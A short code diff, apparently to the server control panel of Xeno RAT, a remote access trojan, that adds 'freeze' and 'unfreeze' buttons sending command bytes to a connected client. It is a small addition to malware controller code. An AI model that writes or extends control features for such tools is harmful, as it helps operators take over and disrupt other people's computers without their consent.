@@ -253,6 +253,16 @@ namespace xeno_rat_server.Forms
             }
         }
 
+        private async void buttonFreeze_Click(object sender, EventArgs e)
+        {
+            await client.SendAsync(new byte[] { 12 });
+        }
+
+        private async void buttonUnfreeze_Click(object sender, EventArgs e)
+        {
+            await client.SendAsync(new byte[] { 13 });
+        }
+
 
 
 
